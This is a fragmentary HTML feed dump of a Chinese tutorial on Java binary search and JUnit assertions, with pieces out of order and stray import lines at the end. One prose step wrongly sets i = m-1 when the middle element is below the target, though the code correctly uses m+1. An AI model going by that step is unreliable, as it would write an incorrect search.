<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import org.junit.jupiter.api.Test;
</span></span><span class="line"><span class="cl">import org.junit.jupiter.api.DisplayName;</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>在测试函数之前加上<code>@Test</code>和<code>@DisplayName()</code></li>
</ol>
<ul>
<li><code>@DisplayName()</code>为测试类或测试方法提供自定义显示名称，便于得到良好可观的输出</li>
<li><code>@Test</code>表示标注测试类或测试方法</li>
</ul>
<h3 id="相关函数" class="heading-element"><span>相关函数</span>
 <a href="#%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><ol>
<li>assertEquals
<ul>
<li>JUnit 框架中的一个静态方法，用于在测试中进行断言，<strong>验证预期值与实际值是否相等</strong>。如果它们不相等，测试将失败，并报告一个错误。</li>
<li>例子</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assertEquals(0, binarySearch(a, 7));</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>解释：<br>
0为预期值<br>
binarySearch(a, 7)为结果值<br>
如果结果一致不报错，不一致则报错</p>
</blockquote>
</li>
</ol>

item.title: JAVA算法 · 二分查找
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="二分查找" class="heading-element"><span>二分查找</span>
 <a href="#%e4%ba%8c%e5%88%86%e6%9f%a5%e6%89%be" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="前提" class="heading-element"><span>前提</span>
 <a href="#%e5%89%8d%e6%8f%90" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ol>
<li>给定一个内涵n个元素的有序数组A，满足升序</li>
<li>一个待查值target</li>
</ol>
<h2 id="算法步骤" class="heading-element"><span>算法步骤</span>
 <a href="#%e7%ae%97%e6%b3%95%e6%ad%a5%e9%aa%a4" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ol>
<li>设置 i = 0， j = n - 1</li>
<li>两种情况
<ol>
<li>如果 i &gt; j，未找到</li>
<li>设置 m = (i + j) / 2，并且向下取整 =&gt; 舍</li>
</ol>
</li>
<li>若target &lt; Am设置j = m-1，进行2</li>
<li>若Am &lt; target设置i = m-1，进行2</li>
<li>若Am = target，则找到</li>
</ol>
<h2 id="代码实现" class="heading-element"><span>代码实现</span>
 <a href="#%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">com</span><span class="p">.</span><span class="nx">ting</span><span class="p">.</span><span class="nx">binarySearch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">BinarySearch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="c1">// 二分查找基础版
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">// Params:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">// a-待查很早的升序数组
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">// Returns:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">// 找到则返回索引
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">// 找不到返回-1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nx">public</span> <span class="nx">static</span> <span class="kt">int</span> <span class="nf">binarySearch</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="nx">a</span><span class="p">,</span> <span class="kt">int</span> <span class="nx">target</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kt">int</span> <span class="nx">i</span> <span class="p">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">j</span> <span class="p">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//指针和初值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nf">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">j</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//范围内还有数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kt">int</span> <span class="nx">m</span> <span class="p">=</span> <span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">//注意：JAVA里面自动取整，就不用再调用取整函数floor()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">if</span><span class="p">(</span><span class="nx">target</span> <span class="p">&lt;</span> <span class="nx">a</span><span class="p">[</span><span class="nx">m</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nx">j</span> <span class="p">=</span> <span class="nx">m</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">target</span> <span class="p">&gt;</span> <span class="nx">a</span><span class="p">[</span><span class="nx">m</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nx">i</span> <span class="p">=</span> <span class="nx">m</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="nx">m</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>

</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">static</span> <span class="nx">com</span><span class="p">.</span><span class="nx">ting</span><span class="p">.</span><span class="nx">binarySearch</span><span class="p">.</span><span class="nx">BinarySearch</span><span class="p">.</span><span class="nx">binarySearch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">static</span> <span class="nx">org</span><span class="p">.</span><span class="nx">junit</span><span class="p">.</span><span class="nx">jupiter</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nx">Assertions</span><span class="p">.</span><span class="nx">assertEquals</span><span class="p">;</span>
